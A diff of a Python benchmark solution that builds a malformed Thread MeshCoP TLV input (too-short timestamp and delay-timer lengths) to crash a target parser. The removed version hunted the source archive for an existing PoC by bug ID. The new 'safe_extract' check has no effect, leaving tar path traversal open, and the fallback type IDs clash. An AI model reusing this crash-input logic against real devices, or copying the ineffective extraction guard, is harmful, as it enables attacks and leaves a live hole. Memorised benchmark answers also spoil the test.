@@ -1,162 +1,133 @@
 import os
 import re
 import tarfile
+import tempfile
+import shutil
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        BUG_ID = "385180600"
-        TARGET_POC_LEN = 262
+        extract_dir = self._extract_source(src_path)
+        try:
+            type_ids = self._extract_tlv_type_ids(extract_dir)
+        finally:
+            shutil.rmtree(extract_dir, ignore_errors=True)
 
-        def is_probably_binary(sample: bytes) -> bool:
-            if not sample:
-                return False
-            if b"\0" in sample:
-                return True
-            control = 0
-            high = 0
-            for b in sample:
-                if b > 0x7E:
-                    high += 1
-                elif b < 0x20 and b not in (9, 10, 13):
-                    control += 1
-            return (control + high) > len(sample) * 0.3
+        active = type_ids.get("active", 0x51) & 0xFF
+        pending = type_ids.get("pending", 0x52) & 0xFF
+        delay = type_ids.get("delay", 0x53) & 0xFF
 
+        tlvs = bytearray()
+
+        # Active Timestamp TLV with too-short length (expected 8, provide 1)
+        tlvs.append(active)
+        tlvs.append(1)  # length
+        tlvs.append(0)  # single byte of value
+
+        # Pending Timestamp TLV with too-short length
+        tlvs.append(pending)
+        tlvs.append(1)
+        tlvs.append(0)
+
+        # Delay Timer TLV with too-short length (expected 4, provide 1)
+        tlvs.append(delay)
+        tlvs.append(1)
+        tlvs.append(0)
+
+        return bytes(tlvs)
+
+    def _extract_source(self, src_path: str) -> str:
+        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
         with tarfile.open(src_path, "r:*") as tar:
-            members = tar.getmembers()
+            def is_within_directory(directory, target):
+                abs_directory = os.path.abspath(directory)
+                abs_target = os.path.abspath(target)
+                prefix = os.path.commonprefix([abs_directory, abs_target])
+                return prefix == abs_directory
 
-            # Step 1: Directly look for a PoC file that contains the bug ID in its name
-            best_member = None
-            best_score = None
-
-            for member in members:
-                if not member.isfile():
-                    continue
-                base = os.path.basename(member.name).lower()
-                if BUG_ID in base:
-                    size = member.size
-                    if size == 0:
+            def safe_extract(tar_obj, path=".", members=None):
+                for member in tar_obj.getmembers():
+                    member_path = os.path.join(path, member.name)
+                    if not is_within_directory(path, member_path):
                         continue
-                    try:
-                        f = tar.extractfile(member)
-                        if f is None:
-                            continue
-                        sample = f.read(min(4096, size))
-                    except Exception:
-                        continue
-                    binary = is_probably_binary(sample)
-                    penalty = 0 if binary else 1000
-                    diff = abs(size - TARGET_POC_LEN) + penalty
-                    if best_member is None or diff < best_score:
-                        best_member = member
-                        best_score = diff
+                tar_obj.extractall(path, members)
 
-            if best_member is not None:
-                f = tar.extractfile(best_member)
-                if f is not None:
-                    data = f.read()
-                    if data:
-                        return data
+            safe_extract(tar, tmpdir)
+        return tmpdir
 
-            # Step 2: Look for generic PoC/testcase/crash-style files
-            keywords = ("poc", "pocs", "crash", "testcase", "oss-fuzz", "clusterfuzz")
-            best_member = None
-            best_score = None
+    def _extract_tlv_type_ids(self, root_dir: str) -> dict:
+        active = None
+        pending = None
+        delay = None
 
-            for member in members:
-                if not member.isfile():
+        code_exts = (".h", ".hpp", ".hh", ".hxx", ".c", ".cc", ".cpp", ".cxx")
+
+        define_re = re.compile(
+            r"^\s*#\s*define\s+(\w+)\s+(0x[0-9A-Fa-f]+|\d+)\b", re.MULTILINE
+        )
+        enum_assign_re = re.compile(
+            r"\b([A-Za-z_]\w*)\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b"
+        )
+
+        for dirpath, _, filenames in os.walk(root_dir):
+            for fname in filenames:
+                if not fname.endswith(code_exts):
                     continue
-                path_lower = member.name.lower()
-                if not any(kw in path_lower for kw in keywords):
-                    continue
-                size = member.size
-                if size == 0:
-                    continue
+                fpath = os.path.join(dirpath, fname)
                 try:
-                    f = tar.extractfile(member)
-                    if f is None:
-                        continue
-                    sample = f.read(min(4096, size))
+                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
+                        text = f.read()
                 except Exception:
                     continue
-                if not is_probably_binary(sample):
-                    continue
-                diff = abs(size - TARGET_POC_LEN)
-                if best_member is None or diff < best_score:
-                    best_member = member
-                    best_score = diff
 
-            if best_member is not None:
-                f = tar.extractfile(best_member)
-                if f is not None:
-                    data = f.read()
-                    if data:
-                        return data
-
-            # Step 3: Fallback – synthesize a PoC based on TLV information in headers
-            tlv_type_values = {}
-
-            def extract_tlv_value(symbol: str) -> None:
-                if symbol in tlv_type_values:
-                    return
-                pattern = re.compile(
-                    r"\b" + re.escape(symbol) + r"\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)"
-                )
-                for m in members:
-                    if not m.isfile():
-                        continue
-                    base = os.path.basename(m.name)
-                    if not base.endswith(
-                        (".h", ".hpp", ".hh", ".hxx", ".inc", ".inl")
-                    ):
-                        continue
+                # Look at #define macros
+                for name, val in define_re.findall(text):
+                    up = name.upper()
                     try:
-                        f = tar.extractfile(m)
-                        if f is None:
-                            continue
-                        text = f.read(40000).decode("utf-8", "ignore")
-                    except Exception:
+                        ival = int(val, 0)
+                    except ValueError:
                         continue
-                    mt = pattern.search(text)
-                    if mt:
-                        val = int(mt.group(1), 0)
-                        tlv_type_values[symbol] = val
-                        return
 
-            for symbol in ("kActiveTimestamp", "kPendingTimestamp", "kDelayTimer"):
-                extract_tlv_value(symbol)
+                    if "TLV" in up:
+                        if "TIMESTAMP" in up:
+                            if "ACTIVE" in up and active is None:
+                                if 0 <= ival <= 255:
+                                    active = ival
+                            elif "PENDING" in up and pending is None:
+                                if 0 <= ival <= 255:
+                                    pending = ival
+                        if "DELAY" in up and "TIMER" in up and delay is None:
+                            if 0 <= ival <= 255:
+                                delay = ival
 
-            tlv_order = []
-            if "kActiveTimestamp" in tlv_type_values:
-                tlv_order.append(
-                    ("kActiveTimestamp", tlv_type_values["kActiveTimestamp"])
-                )
-            if "kPendingTimestamp" in tlv_type_values:
-                tlv_order.append(
-                    ("kPendingTimestamp", tlv_type_values["kPendingTimestamp"])
-                )
-            if "kDelayTimer" in tlv_type_values:
-                tlv_order.append(("kDelayTimer", tlv_type_values["kDelayTimer"]))
+                # Look at enum assignments
+                for name, val in enum_assign_re.findall(text):
+                    low = name.lower()
+                    try:
+                        ival = int(val, 0)
+                    except ValueError:
+                        continue
 
-            if not tlv_order:
-                tlv_order = [
-                    ("kActiveTimestamp", 1),
-                    ("kPendingTimestamp", 2),
-                    ("kDelayTimer", 52),
-                ]
+                    if not (0 <= ival <= 255):
+                        continue
 
-            payload = bytearray()
+                    if "timestamp" in low:
+                        if "active" in low and active is None:
+                            active = ival
+                        elif "pending" in low and pending is None:
+                            pending = ival
+                    if "delay" in low and "timer" in low and delay is None:
+                        delay = ival
 
-            first_type = tlv_order[0][1] & 0xFF
-            payload.append(first_type)
-            payload.append(0)  # zero-length TLV value
+                if active is not None and pending is not None and delay is not None:
+                    return {"active": active, "pending": pending, "delay": delay}
 
-            if len(payload) < TARGET_POC_LEN and len(tlv_order) > 1:
-                second_type = tlv_order[1][1] & 0xFF
-                payload.append(second_type)
-                payload.append(0)
+        # Fallback guesses (based on Thread MeshCoP TLV assignments)
+        if active is None:
+            active = 0x51
+        if pending is None:
+            pending = 0x50
+        if delay is None:
+            delay = 0x53
 
-            while len(payload) < TARGET_POC_LEN:
-                payload.append(0x41)
-
-            return bytes(payload)
+        return {"active": active, "pending": pending, "delay": delay}
